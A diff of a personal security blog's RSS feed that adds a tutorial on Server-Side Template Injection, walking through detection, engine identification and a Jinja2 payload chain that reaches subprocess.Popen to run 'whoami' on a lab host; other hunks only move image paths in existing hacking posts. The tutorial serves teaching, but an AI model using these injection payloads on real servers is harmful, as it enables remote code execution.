@@ -6,8 +6,107 @@
 		<generator>Hugo -- gohugo.io</generator>
 		<language>en-us</language>
 		<copyright>This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.</copyright>
-		<lastBuildDate>Thu, 20 May 2021 12:05:40 +0530</lastBuildDate>
+		<lastBuildDate>Wed, 30 Jun 2021 11:41:54 +0530</lastBuildDate>
 		<atom:link href="https://riteshpuvvada.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+		
+		<item>
+			<title>Server-Side Template Injection</title>
+			<link>https://riteshpuvvada.github.io/posts/ssti/</link>
+			<pubDate>Wed, 30 Jun 2021 11:41:54 +0530</pubDate>
+			
+			<guid>https://riteshpuvvada.github.io/posts/ssti/</guid>
+			<description>Server-Side Template Injection (SSTI) is an exploit in which the attacker can take advantage of an insecure template engine to inject a malicious payload into a template, which is then executed server-side.
+What is a template engine? A template engine enables you to use static template files in your application. At runtime, the template engine replaces variables in a template file with actual values, and transforms the template into an HTML file sent to the client.</description>
+			<content type="html"><![CDATA[<p>Server-Side Template Injection (SSTI) is an exploit in which the attacker can take advantage of an insecure template engine to inject a malicious payload into a template, which is then executed server-side.</p>
+<h3 id="what-is-a-template-engine">What is a template engine?</h3>
+<p>A template engine enables you to use static template files in your application. At runtime, the template engine replaces variables in a template file with actual values, and transforms the template into an HTML file sent to the client. This approach makes it easier to design an HTML page.</p>
+<p><img src="/img/blog/SSTI/SSTI.png" alt="img"></p>
+<h3 id="what-is-the-impact-of-server-side-template-injection">What is the impact of server-side template injection?</h3>
+<ul>
+<li>SSTI vulnerabilities can expose websites to a variety of attacks.</li>
+<li>As the name suggests, SSTI is a server-side exploit means these vulnerabilities are even more critical.</li>
+<li>At the severe end of the scale, an attacker can potentially achieve Remote Code Execution (RCE).This helps the attacker to take full control of the back-end server.</li>
+</ul>
+<h3 id="how-does-server-side-template-injection-vulnerability-occur">How does server-side template injection vulnerability occur?</h3>
+<p>Server-side template injection vulnerabilities arise when user input is concatenated into templates rather than being passed in as data.</p>
+<p>Example :</p>
+<pre><code>$output = $twig-&gt;render(&quot;Dear {first_name},&quot;, array(&quot;first_name&quot; =&gt; $user.first_name) );
+
+$output = $twig-&gt;render(&quot;Dear &quot; . $_GET['name']);
+</code></pre><p>Instead of a static value being passed into the template, part of the template itself is being dynamically generated using the <code>GET</code> parameter <code>name</code>. As template syntax is evaluated server-side, this potentially allows an attacker to place a server-side template injection payload inside the <code>name</code> parameter as follows:</p>
+<pre><code>http://vulnerable-website.com/profile/{{Payload}}
+</code></pre><p><img src="/img/blog/SSTI/SSTI1.png" alt="img"></p>
+<h3 id="methodology">Methodology</h3>
+<p>Identifying server-side template injection vulnerabilities and crafting a successful attack typically involves the following high-level process.</p>
+<p><img src="/img/blog/SSTI/attack.png" alt="img"></p>
+<h3 id="detect">Detect</h3>
+<p>As with any vulnerability, the first step towards exploitation is being able to find it. Perhaps the simplest initial approach is to try fuzzing the template by injecting a sequence of special characters commonly used in template expressions, such as <code>${{ &lt;%[%'&quot;}}% </code>. If an exception is raised, this indicates that the injected template syntax is potentially being interpreted by the server in some way. This is one sign that a vulnerability to server-side template injection may exist.</p>
+<p>Server-side template injection vulnerabilities occur in two distinct contexts, each of which requires its own detection method. Regardless of the results of your fuzzing attempts, it is important to also try the following context-specific approaches. If fuzzing was inconclusive, a vulnerability may still reveal itself using one of these approaches. Even if fuzzing did suggest a template injection vulnerability, you still need to identify its context in order to exploit it.</p>
+<p><img src="/img/blog/SSTI/SSTI2.png" alt="img"></p>
+<h3 id="identify">Identify</h3>
+<p>Now that we have detected what characters caused the application to error, it is time to identify what template engine is being used.</p>
+<figure class="right"><img src="/img/blog/template-decision-tree.png"
+         alt="image"/><figcaption>
+            <p>Decision tree</p>
+        </figcaption>
+</figure>
+
+<p>Although there are a huge number of templating languages, many of them use very similar syntax that is specifically chosen not to clash with HTML characters. As a result, it can be relatively simple to create probing payloads to test which template engine is being used.</p>
+<p>However, if this is not the case, we can use a decision tree to help us identify the template engine.</p>
+<p>To follow the decision tree, start at the very left and include the variable in your request. Follow the arrow depending on the output:</p>
+<ul>
+<li>Green arrow - The expression evaluated (i.e 42)</li>
+<li>Red arrow - The expression is shown in the output (i.e ${7*7})</li>
+</ul>
+<p>In the case of our example, the process looks as follows:</p>
+<p><img src="/img/blog/SSTI/SSTI3.png" alt="img"></p>
+<p>The application mirrors the user input, so we follow the red arrow:</p>
+<p><img src="/img/blog/SSTI/SSTI4.png" alt="img"></p>
+<p>You should be aware that the same payload can sometimes return a successful response in more than one template language. For example, the payload <code>{{7*'7'}}</code> returns <code>49</code> in <code>Twig</code> and <code>7777777</code> in <code>Jinja2</code>. Therefore, it is important not to jump to conclusions based on a single successful response.</p>
+<p><img src="/img/blog/SSTI/SSTI5.png" alt="img"></p>
+<p>As follows the template engine is being used in this application is <code>Jinja2</code></p>
+<h3 id="syntax">Syntax</h3>
+<p>After having identified the template engine, we now need to learn its syntax.</p>
+<p>Where better to learn than the official <a href="https://jinja.palletsprojects.com/en/2.11.x/">documentation</a>?</p>
+<p>In the case of our example, the documentation states the following:</p>
+<ul>
+<li><code>{{</code> - Used to mark the start of a print statement</li>
+<li><code>}}</code> - Used to mark the end of a print statement</li>
+<li><code>{%</code> - Used to mark the start of a block statement</li>
+<li><code>%}</code> - Used to mark the end of a block statement</li>
+</ul>
+<h3 id="exploit">Exploit</h3>
+<p>At this point, we know:</p>
+<ul>
+<li>The application is vulnerable to SSTI</li>
+<li>The injection point</li>
+<li>The template engine</li>
+<li>The template engine syntax</li>
+</ul>
+<p>Since <code>Jinja2</code> is a Python based template engine, we will look at ways to run shell commands in Python.</p>
+<p>Python allows us to call the current class instance with <a href="https://docs.python.org/release/2.6.4/library/stdtypes.html#instance.__class__">.<strong>class</strong></a>, we can call this on an empty string:</p>
+<pre><code>Payload: http://10.10.116.231:5000/profile/{{ ''.__class__ }}.
+</code></pre><p><img src="/img/blog/SSTI/SSTI6.png" alt="img"></p>
+<p>Classes in Python have an attribute called <a href="https://docs.python.org/release/2.6.4/library/stdtypes.html#class.__mro__">.<strong>mro</strong></a> that allows us to climb up the inherited object tree:</p>
+<pre><code>Payload: http://10.10.116.231:5000/profile/{{ ''.__class__.__mro__ }}.
+</code></pre><p><img src="/img/blog/SSTI/SSTI7.png" alt="img"></p>
+<p>Since we want the root object, we can access the second property (first index):</p>
+<pre><code>Payload: http://10.10.116.231:5000/profile/{{ ''.__class__.__mro__[1] }}.
+</code></pre><p>Objects in Python have a method called <a href="https://docs.python.org/release/2.6.4/library/stdtypes.html#class.__subclasses__">.<strong>subclassess</strong></a> that allows us to climb down the object tree:</p>
+<pre><code>Payload: http://10.10.116.231:5000/profile/{{ ''.__class__.__mro__[1].__subclasses__() }}.
+</code></pre><p><img src="/img/blog/SSTI/SSTI8.png" alt="img"></p>
+<p>As this whole output is just a Python list, we can access this by using its index. You can find this by either trial and error, or by counting its position in the list.</p>
+<p>In this example, the position in the list is 400 (index 401):</p>
+<pre><code>Payload: http://10.10.116.231:5000/profile/{{ ''.__class__.__mro__[1].__subclasses__()[401] }}.
+</code></pre><p>The above payload essentially calls the <strong>subprocess.Popen</strong> method, now all we have to do is invoke it the system user is visible on the screen.</p>
+<pre><code>Payload: http://10.10.116.231:5000/profile/{{ ''.__class__.__mro__[1].__subclasses__()[401](&quot;whoami&quot;, shell=True, stdout=-1).communicate() }}
+</code></pre><p><img src="/img/blog/SSTI/SSTI9.png" alt="img"></p>
+<p>Note :</p>
+<h4 id="payloads">Payloads</h4>
+<p>For quick reference, an amazing GitHub repo has been created as a cheatsheet for payloads for all web vulnerabilities, including SSTI.</p>
+<p>The repo is located <a href="https://github.com/swisskyrepo/PayloadsAllTheThings">here</a>, while the document for SSTI is located <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection">here</a>.</p>
+]]></content>
+		</item>
 		
 		<item>
 			<title>Bypassing Upload Filters</title>
@@ -18,7 +117,7 @@
 			<description>One of the challenging factors to a Hacker in a web application attack is the file upload. The first step in every attack is to get some code and inject it to the system to be attacked. The attack needs to find an uncomplicated and flawless path to get the code executed. Using a file upload attacker achieves his first step.
 Examples Attacks on application platforms  Upload .jsp file into web tree - jsp code executed as the web user Upload .</description>
 			<content type="html"><![CDATA[<p>One of the challenging factors to a <strong>Hacker</strong> in a web application attack is the file upload. The first step in every attack is to get some code and inject it to the system to be attacked. The attack needs to find an uncomplicated and flawless path to get the code executed. Using a file upload attacker achieves his first step.</p>
-<p><img src="/img/blog/backdoor.png" alt="img"></p>
+<p><img src="/img/blog/YOJ/backdoor.png" alt="img"></p>
 <h3 id="examples">Examples</h3>
 <h4 id="attacks-on-application-platforms">Attacks on application platforms</h4>
 <ul>
@@ -166,7 +265,7 @@ ff02::2 ip6-allrouters
 </code></pre><blockquote>
 <p>Hurray! we are in</p>
 </blockquote>
-<p><img src="/img/blog/YOJ1.PNG" alt="img"></p>
+<p><img src="/img/blog/YOJ/YOJ1.PNG" alt="img"></p>
 <blockquote>
 <p>It&rsquo;s a normal webpage and doesn&rsquo;t consist of any dynamic content, so I opened <code>monitorr.robyns-petshop.thm</code>.</p>
 </blockquote>
@@ -396,7 +495,7 @@ else:
 <p>Note: Here, the exploit produces random names with an extension <code>.phtml</code></p>
 </blockquote>
 <p>Let&rsquo;s exploit to get a reverse shell ..!</p>
-<p><img src="/img/blog/YOJ2.png" alt="img"></p>
+<p><img src="/img/blog/YOJ/YOJ2.png" alt="img"></p>
 <blockquote>
 <p>Hurray! we got the shell. All we need to do is find the flags</p>
 </blockquote>
@@ -413,7 +512,7 @@ else:
 </ol>
 <h3 id="root-privilege-escalation">Root privilege escalation</h3>
 <p>We need to run <code>linPEAS.sh</code>. I have already downloaded <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">linPEAS </a></p>
-<p><img src="/img/blog/YOJ3.png" alt="img"></p>
+<p><img src="/img/blog/YOJ/YOJ3.png" alt="img"></p>
 <p><strong>Ngrok allows you to expose a web server running on your local machine to the internet. Just tell ngrok what port your web server is listening on.</strong></p>
 <p><a href="https://ngrok.com/docs">Ngrok Documentation</a></p>
 <p><a href="https://ngrok.com/download">Download Ngrok</a></p>
@@ -449,7 +548,7 @@ File Type: Python script, ASCII text executable, with very long lines, with CRLF
 
 Copied to: /root/46362.py
 </code></pre><p>Let&rsquo;s run the exploit to be a <strong>Root user</strong></p>
-<p><img src="/img/blog/YOJ4.png" alt="img"></p>
+<p><img src="/img/blog/YOJ/YOJ4.png" alt="img"></p>
 <pre><code>www-data@petshop:/dev/shm$ python3 dirty.py
 
       ___  _ ____ ___ _   _     ____ ____ ____ _  _ 
@@ -508,7 +607,7 @@ root@petshop:/dev/shm#
 			<content type="html"><![CDATA[<h3 id="what-is-sql-injection">What is SQL injection?</h3>
 <p>SQL injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It generally allows an attacker to view data that they are not normally able to retrieve. This might include data belonging to other users, or any other data that the application itself is able to access. In many cases, an attacker can modify or delete this data, causing persistent changes to the application&rsquo;s content or behavior.</p>
 <p>In some situations, an attacker can escalate an SQL injection attack to compromise the underlying server or other back-end infrastructure, or perform a denial-of-service attack.</p>
-<p><img src="/img/blog/sql.png" alt="img"></p>
+<p><img src="/img/blog/SQL/sql.png" alt="img"></p>
 <h3 id="what-is-the-impact-of-a-sql-injection">What is the impact of a SQL injection?</h3>
 <p>A successful SQL injection attack can result in unauthorized access to sensitive data, such as passwords, credit card details, or personal user information. In recent years, many high-profile data breaches have been the result of SQL injection attacks, leading to reputational damage and regulatory fines. In some cases, an attacker can obtain a persistent backdoor into an organization&rsquo;s systems, leading to a long-term compromise that can go unnoticed for an extended period.</p>
 <h3 id="sql-injection-examples">SQL injection examples</h3>
